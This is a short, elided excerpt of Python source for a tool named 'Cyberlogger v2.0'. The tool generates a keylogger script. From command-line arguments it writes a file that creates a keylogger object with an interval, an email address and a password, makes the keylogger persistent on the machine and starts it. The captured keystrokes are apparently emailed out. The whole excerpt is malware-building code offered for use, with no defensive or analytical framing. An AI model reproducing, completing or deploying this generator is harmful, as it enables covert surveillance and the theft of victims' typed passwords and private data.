...
def get_arguments():
    parser = argparse.ArgumentParser(description='Cyberlogger v2.0')
...
def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        ...
        file.write("cyberlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("cyberlogger.become_persistent()\n")
        file.write("cyberlogger.start()\n")
...
print("Generated by Abhisek Nanda")
